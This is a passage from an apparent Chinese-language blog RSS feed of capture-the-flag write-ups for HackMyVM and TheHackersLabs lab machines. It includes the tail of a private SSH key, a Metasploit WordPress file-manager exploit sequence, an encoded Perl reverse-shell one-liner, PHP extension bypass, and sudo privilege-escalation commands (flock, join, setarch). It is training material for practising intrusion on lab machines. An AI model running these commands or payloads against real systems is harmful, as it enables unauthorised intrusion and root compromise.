D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
<br>利用私钥切换到bonita用户<br>ssh -i id\_rsa bonita@192.168.9.13 -p 2222
bonita@twisted:~$ cat user.txt 
HMVblackcat
<br><br>执行bonita目录下的beroot<br>提示我们需要密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.003.png" referrerpolicy="no-referrer"><br>想到最开始利用<a data-tooltip-position="top" aria-label="../../26-工具使用/StegSeek使用" data-href="../../26-工具使用/StegSeek使用" href="https://www.c1trus.top/26-工具使用/stegseek使用.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>时还有两个没有用上<br>sexymama<br>westlife<br>试了一下都是错的<br>逆向一下这个可执行文件看看<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.004.png" referrerpolicy="no-referrer"><br>code应该就是5880<br>成功提权root<br>bonita@twisted:~$ ./beroot
Enter the code:
 5880
 root@twisted:~# 
]]></description><link>https://www.c1trus.top/24-渗透/hmv/11.twisted.html</link><guid isPermaLink="false">24-渗透/HMV/11.Twisted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[12.Vulny]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 用msf梭哈" data-href="#3. 用msf梭哈" href="https://www.c1trus.top/about:blank#3._用msf梭哈" class="internal-link" target="_self" rel="noopener nofollow">3. 用msf梭哈</a>
<br><a data-tooltip-position="top" aria-label="4. 提权root" data-href="#4. 提权root" href="https://www.c1trus.top/about:blank#4._提权root" class="internal-link" target="_self" rel="noopener nofollow">4. 提权root</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Vulny
<br>作者：sml
<br>难度：⭐️⭐️
<br>知识点：wp_file_manager_rce、sudo提权（flock）
<br><br>┌──(root㉿kali)-[~]
└─# nmap -sS 192.168.9.14 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 18:57 CST
Nmap scan report for 192.168.9.14
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
MAC Address: 08:00:27:74:86:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
<br>┌──(root㉿kali)-[/home/kali/hmv/Vulny]
└─# gobuster dir -u http://192.168.9.14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,jpg,php,html,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--&gt; http://192.168.9.14/javascript/]
/secret               (Status: 301) [Size: 313] [--&gt; http://192.168.9.14/secret/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>首页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" referrerpolicy="no-referrer"><br>/secret <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.002.png" referrerpolicy="no-referrer"><br>/javascript<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.003.png" referrerpolicy="no-referrer"><br>wordpress报错了。说找不到config-168.9.14.php文件，虽然保存了但是我们也得到了这个文件夹应该是属于wordpress的<br>对/screct目录进行扫描<br>┌──(root㉿kali)-[/home/kali/hmv/Vulny]
└─# dirsearch -u http://192.168.9.14/secret
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Vulny/reports/http\_192.168.9.14/\_secret\_24-11-06\_19-07-03.txt

Target: http://192.168.9.14/

[19:07:03] Starting: secret/
[19:07:04] 403 -  277B  - /secret/.ht\_wsr.txt
[19:07:04] 403 -  277B  - /secret/.htaccess.bak1
[19:07:04] 403 -  277B  - /secret/.htaccess.orig
[19:07:04] 403 -  277B  - /secret/.htaccess.sample
[19:07:04] 403 -  277B  - /secret/.htaccess\_extra
[19:07:04] 403 -  277B  - /secret/.htaccess.save
[19:07:04] 403 -  277B  - /secret/.htaccess\_orig
[19:07:04] 403 -  277B  - /secret/.htaccessBAK
[19:07:04] 403 -  277B  - /secret/.htaccessOLD
[19:07:04] 403 -  277B  - /secret/.htaccess\_sc
[19:07:04] 403 -  277B  - /secret/.htaccessOLD2
[19:07:04] 403 -  277B  - /secret/.html
[19:07:04] 403 -  277B  - /secret/.htm
[19:07:04] 403 -  277B  - /secret/.htpasswd\_test
[19:07:04] 403 -  277B  - /secret/.htpasswds
[19:07:04] 403 -  277B  - /secret/.httr-oauth
[19:07:04] 403 -  277B  - /secret/.php
[19:07:20] 200 -    3KB - /secret/readme.html
[19:07:26] 301 -  322B  - /secret/wp-admin  -&gt;  http://192.168.9.14/secret/wp-admin/
[19:07:26] 301 -  324B  - /secret/wp-content  -&gt;  http://192.168.9.14/secret/wp-content/
[19:07:26] 200 -  511B  - /secret/wp-content/
[19:07:26] 500 -  610B  - /secret/wp-content/plugins/akismet/admin.php
[19:07:26] 500 -  610B  - /secret/wp-content/plugins/akismet/akismet.php
[19:07:26] 200 -  469B  - /secret/wp-content/upgrade/
[19:07:26] 200 -  486B  - /secret/wp-content/uploads/
[19:07:26] 403 -  277B  - /secret/wp-includes/
[19:07:26] 301 -  325B  - /secret/wp-includes  -&gt;  http://192.168.9.14/secret/wp-includes/
[19:07:26] 500 -    0B  - /secret/wp-includes/rss-functions.php
[19:07:26] 500 -    3KB - /secret/wp-admin/setup-config.php
<br>/secret/readme.html<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.004.png" referrerpolicy="no-referrer"><br>/secret/wp-content/<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.005.png" referrerpolicy="no-referrer"><br>/secret/wp-content/uploads/<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.006.png" referrerpolicy="no-referrer"><br>这里看起来应该是有一个文件目录泄露<br>在<a rel="noopener nofollow" class="external-link" href="http://192.168.9.14/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip" target="_blank">http://192.168.9.14/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip</a><br>发现了wordpress的插件包<br>看下里面的readme.txt 获取到了版本 6.0<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.007.png" referrerpolicy="no-referrer"><br>网上搜索一下相关的漏洞<a rel="noopener nofollow" class="external-link" href="https://www.cnblogs.com/FallenStar/articles/17354363.html" target="_blank">https://www.cnblogs.com/FallenStar/articles/17354363.html</a><br><br>msfconsole
search wp-file-manager
use exploit/multi/http/wp\_file\_manager\_rce
set targeturi /secret/
set rhost 192.168.9.14
set rport 80
set lhost 192.168.9.3
set lport 1199
set forceexploit true
run
shell
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.008.png" referrerpolicy="no-referrer"><br>数据库信息获取<br>先把wordpress给他download下来<br>shell内：
cd /usr/share/wordpress
tar -czvf wordpress.tar.gz \*
exit y //退出shell
download /usr/share/wordpress/wordpress.tar.gz /home/kali/hmv/Vulny/wordpress.tar.gz
<br>端口扫描时发现开放了33060端口 对应的服务时Mysqlx<br>看下配置文件<br>cat /usr/share/wordpress/wp-config.php
<br>&lt;?php
*/\*\*\
 *\* WordPress's Debianised default master config file*
 *\* Please do NOT edit and learn how the configuration works in*
 *\* /usr/share/doc/wordpress/README.Debian*
 *\*\*\*/*

*/\* Look up a host-specific config file in*
 *\* /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php*
 *\*/*
$debian\_server = preg\_replace('/:.\*/', "", $\_SERVER['HTTP\_HOST']);
$debian\_server = preg\_replace("/[^a-zA-Z0-9.\-]/", "", $debian\_server);
$debian\_file = '/etc/wordpress/config-'.strtolower($debian\_server).'.php';
*/\* Main site in case of multisite with subdomains \*/*
$debian\_main\_server = preg\_replace("/^[^.]\*\./", "", $debian\_server);
$debian\_main\_file = '/etc/wordpress/config-'.strtolower($debian\_main\_server).'.php';

if (file\_exists($debian\_file)) {
    require\_once($debian\_file);
    define('DEBIAN\_FILE', $debian\_file);
} elseif (file\_exists($debian\_main\_file)) {
    require\_once($debian\_main\_file);
    define('DEBIAN\_FILE', $debian\_main\_file);
} elseif (file\_exists("/etc/wordpress/config-default.php")) {
    require\_once("/etc/wordpress/config-default.php");
    define('DEBIAN\_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither &lt;b&gt;$debian\_file&lt;/b&gt; nor &lt;b&gt;$debian\_main\_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

*/\* idrinksomewater \*/*

*/\* Default value for some constants if they have not yet been set*
   *by the host-specific config files \*/*
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP\_CORE\_UPDATE'))
    define('WP\_CORE\_UPDATE', false);
if (!defined('WP\_ALLOW\_MULTISITE'))
    define('WP\_ALLOW\_MULTISITE', true);
if (!defined('DB\_NAME'))
    define('DB\_NAME', 'wordpress');
if (!defined('DB\_USER'))
    define('DB\_USER', 'wordpress');
if (!defined('DB\_HOST'))
    define('DB\_HOST', 'localhost');
if (!defined('WP\_CONTENT\_DIR') &amp;&amp; !defined('DONT\_SET\_WP\_CONTENT\_DIR'))
    define('WP\_CONTENT\_DIR', '/var/lib/wordpress/wp-content');

*/\* Default value for the table\_prefix variable so that it doesn't need to*
   *be put in every host-specific config file \*/*
if (!isset($table\_prefix)) {
    $table\_prefix = 'wp\_';
}

if (isset($\_SERVER['HTTP\_X\_FORWARDED\_PROTO']) &amp;&amp; $\_SERVER['HTTP\_X\_FORWARDED\_PROTO'] == 'https')
    $\_SERVER['HTTPS'] = 'on';

require\_once(ABSPATH . 'wp-settings.php');
?&gt;
<br>找不到数据库密码啊，联想到首页提示缺少某个文件猜测就是这个文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.009.png" referrerpolicy="no-referrer"><br>果然在这里<br>cd /etc/wordpress
ls
config-192.168.1.122.php
htaccess
cat con\*
&lt;?php
define('DB\_NAME', 'wordpress');
define('DB\_USER', 'wordpress');
define('DB\_PASSWORD', 'myfuckingpassword');
define('DB\_HOST', 'localhost');
define('DB\_COLLATE', 'utf8\_general\_ci');
define('WP\_CONTENT\_DIR', '/usr/share/wordpress/wp-content');
?&gt;
<br>利用navicat连接上去<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.010.png" referrerpolicy="no-referrer"><br>无法连接。<br>上面wp-config.php里面有一个很奇怪的注释<br>*/\* idrinksomewater \*/*
<br>有可能是用户密码<br>提权到adrian用户<br>su adrian
<br><br>sudo -l
Matching Defaults entries for adrian on vulny:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
sudo flock -u / /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
]]></description><link>https://www.c1trus.top/24-渗透/hmv/12.vulny.html</link><guid isPermaLink="false">24-渗透/HMV/12.Vulny.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[10.Forbidden]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 目录扫描" data-href="#3. 目录扫描" href="https://www.c1trus.top/about:blank#3._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">3. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
<br><a data-tooltip-position="top" aria-label="5. 再次提权" data-href="#5. 再次提权" href="https://www.c1trus.top/about:blank#5._再次提权" class="internal-link" target="_self" rel="noopener nofollow">5. 再次提权</a>
<br><a data-tooltip-position="top" aria-label="6. peter提权root" data-href="#6. peter提权root" href="https://www.c1trus.top/about:blank#6._peter提权root" class="internal-link" target="_self" rel="noopener nofollow">6. peter提权root</a>
<br><a data-tooltip-position="top" aria-label="7. 拓展" data-href="#7. 拓展" href="https://www.c1trus.top/about:blank#7._拓展" class="internal-link" target="_self" rel="noopener nofollow">7. 拓展</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Forbidden
<br>作者：sml
<br>难度：⭐️⭐️
<br>知识点：SUDO提权（join、setarch）、hash爆破
<br><br>端口扫描<br>┌──(root㉿kali)-[/home/kali]
└─# nmap -sS 192.168.9.12 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 12:38 CST
Nmap scan report for 192.168.9.12
Host is up (0.000056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:2E:11:DB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
<br>先看网站<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" referrerpolicy="no-referrer"><br>意思是说Php被禁用了。不让用php<br>且给我们说了管理员用户的名字 marta<br>ftp登录<br>ftp尝试匿名登录发现需要给出密码<br>我猜测就是管理员的名字 Marta<br>成功登录<br>ftp 192.168.9.12        
Connected to 192.168.9.12.
220 (vsFTPd 3.0.3)
Name (192.168.9.12:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||5154|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Oct 09  2020 www
<br>查看www目录<br>ftp&gt; ls
229 Entering Extended Passive Mode (|||21476|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt
<br>┌──(root㉿kali)-[/home/kali]
└─# cat robots.txt  
/note.txt
                                                                                                               
┌──(root㉿kali)-[/home/kali]
└─# cat note.txt  
The extra-secured .jpg file contains my password but nobody can obtain it.
                                                                                                               
┌──(root㉿kali)-[/home/kali]
└─# cat index.html 
&lt;h1&gt;SECURE WEB/FTP&lt;h1&gt;

Hi, Im the best admin of the world.
You cannot execute .php code on this server so you cannot
obtain a reverse shell. Not sure if its misconfigured another things... but
the importart is that php is disabled.

-marta
<br>就是说他把他的密码放到了一个jpg文件里面<br><br>这里没必要扫目录了。因为我们ftp连接上去的就是网站目录<br>这里扫一下udp服务<br>看有没有其他开发的udp端口<br>┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 192.168.9.12  -p 1-100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 12:56 CST
Nmap scan report for 192.168.9.12
Host is up (0.00058s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:2E:11:DB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 114.69 seconds
<br>也没有什么东西<br>根据首页的提示 说Php配置可能会有突破口。<br>绕过Php不断修改php后缀名<br>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml
<br>发现.php5可以被解析<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.002.png" referrerpolicy="no-referrer"><br>直接弹shell<br>perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.003.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@forbidden:/tmp$ find / -perm -4000 2&gt;/dev/null
/home/marta/.forbidden
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
(remote) www-data@forbidden:/tmp$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
<br>执行这个文件后获取到了markos的用户权限<br>这是.forbidden文件逆向后的代码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.004.png" referrerpolicy="no-referrer"><br><br>获取到markos的权限后，看一下sudo -l 发现没有什么东西<br>之前有提示密码常在.jpg里面<br>直接找一下当前用户可以访问的jpg文件<br>find / -name \*.jpg
/var/www/html/TOPSECRETIMAGE.jpg
<br>只有这一张图片是可以访问的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.005.jpeg" referrerpolicy="no-referrer"><br>应该就是一个misc问题了<br>试了几种解法发现不对<br>可能文件名字就是密码<br>密码就是TOPSECRETIMAGE<br>markos@forbidden:~/html$ su marta
Password: 
marta@forbidden:/var/www/html$ sudo -l
Matching Defaults entries for marta on forbidden:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
<br>join读文件<br> marta@forbidden:/var/www/html$ sudo join -a 2 /dev/null /root/root.txt
HMVmymymymymind
<br>也可以用join读取peter用户的密码hash 然后用hashcat进行爆破<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.006.png" referrerpolicy="no-referrer"><br>peter用户的密码是boomer<br><br>peter@forbidden:/var/www/html$ sudo -l
Matching Defaults entries for peter on forbidden:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/setarch
<br>peter@forbidden:/var/www/html$ sudo setarch x86\_64 /bin/bash
root@forbidden:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@forbidden:/var/www/html# 
<br><br>造成Php5后缀可以被解析的原因是<br>/etc/nginx/sites-available/default 中配置了<br>location ~ \.php5$ {
                include snippets/fastcgi-php.conf;
]]></description><link>https://www.c1trus.top/24-渗透/hmv/10.forbidden.html</link><guid isPermaLink="false">24-渗透/HMV/10.Forbidden.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1.Gift]]></title><description><![CDATA[ 
 <br><br>
<br>
<a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
1.Gift

<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.002.png" referrerpolicy="no-referrer"><br>扫描一下目录<br>啥也没有<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.003.png" referrerpolicy="no-referrer"><br>网站看下源码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.004.png" referrerpolicy="no-referrer"><br>看来是真的simple了<br>用simple ssh结果直接就连接上去了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.005.png" referrerpolicy="no-referrer"><br>PS: 几个月前就开始说要打HVM了。结果拖了这么久才开始打。最近玄机打的差不多了。作为HVM打的第一个靶机。特意选了一个比较简单的。（但确实是太简单了 ）]]></description><link>https://www.c1trus.top/24-渗透/hmv/1.gift.html</link><guid isPermaLink="false">24-渗透/HMV/1.Gift.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[0.virtualbox网络配置]]></title><description><![CDATA[ 
 <br>0.virtualbox 网络配置<br>使用Host-only模式<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" referrerpolicy="no-referrer"><br>vmware的kali桥接virtualbox的网卡即可<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.002.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/0.virtualbox网络配置.html</link><guid isPermaLink="false">24-渗透/HMV/0.virtualbox网络配置.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 可疑二进制文件的名称是什么？" data-href="#2. 可疑二进制文件的名称是什么？" href="https://www.c1trus.top/about:blank#2._可疑二进制文件的名称是什么？" class="internal-link" target="_self" rel="noopener nofollow">2. 可疑二进制文件的名称是什么？</a>
<br><a data-tooltip-position="top" aria-label="3. 二进制文件在系统中隐藏了哪个文件？" data-href="#3. 二进制文件在系统中隐藏了哪个文件？" href="https://www.c1trus.top/about:blank#3._二进制文件在系统中隐藏了哪个文件？" class="internal-link" target="_self" rel="noopener nofollow">3. 二进制文件在系统中隐藏了哪个文件？</a>
<br><a data-tooltip-position="top" aria-label="4. 二进制文件在系统日志中留下了哪些命令的痕迹？" data-href="#4. 二进制文件在系统日志中留下了哪些命令的痕迹？" href="https://www.c1trus.top/about:blank#4._二进制文件在系统日志中留下了哪些命令的痕迹？" class="internal-link" target="_self" rel="noopener nofollow">4. 二进制文件在系统日志中留下了哪些命令的痕迹？</a>
<br><a data-tooltip-position="top" aria-label="5. 在哪个日志文件中发现了这些痕迹？（路径）" data-href="#5. 在哪个日志文件中发现了这些痕迹？（路径）" href="https://www.c1trus.top/about:blank#5._在哪个日志文件中发现了这些痕迹？（路径）" class="internal-link" target="_self" rel="noopener nofollow">5. 在哪个日志文件中发现了这些痕迹？（路径）</a>
<br><a data-tooltip-position="top" aria-label="6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）" data-href="#6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）" href="https://www.c1trus.top/about:blank#6._隐藏文件_/etc/.shadow_auth_的权限是多少？（数字形式）" class="internal-link" target="_self" rel="noopener nofollow">6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/binary-trail/" target="_blank">https://thehackerslabs.com/binary-trail/</a><br>
难度 ⭐️⭐️️
<br><br>使用 find 命令搜索非标准目录中的可疑二进制文件 且修改时间大于2024-12-20<br>root@oscar:~# find / -type f -executable -not -path "/bin/*" -not -path "/usr/*" -not -path "/sbin/*" -newermt 2024-12-20 2&gt;/dev/null
/etc/grub.d/01_password
/etc/grub.d/10_linux
/opt/auth_proxy
<br>
/etc/grub.d/ 是 GRUB 引导加载程序的配置脚本目录 10_linux 通常负责加载 Linux 内核 所以基本可以排除上面两个<br>
/opt 一般是第三方程序的安装目录，所以这个可疑程序就是 auth_proxy
<br><br>利用 strings 命令进行提取 含有 / 的字符串。一般文件都会与这个有关<br>root@oscar:~# strings /opt/auth_proxy | grep "/"
/lib64/ld-linux-x86-64.so.2
touch /etc/.shadow_auth

<br>/etc/.shadow_auth<br><br>查看系统日志即可<br>root@oscar:~# strings /var/log/auth.log.1 | grep "auth_proxy"
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci

<br>touch<br>
上面执行 strings /opt/auth_proxy | grep "/" 时就给出了这个命令<br><br>我们在 /var/log/auth.log.1 里面发现了痕迹，但因为日志文件的轮转机制，所以其实是日志文件 /var/log/auth.log 这里面的内容<br><br>root@oscar:~# stat -c "%a" /etc/.shadow_auth
600

<br>600]]></description><link>https://www.c1trus.top/24-渗透/thl/9.binary-trail.html</link><guid isPermaLink="false">24-渗透/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
 <br>****## 1. 基本信息^toc<br>
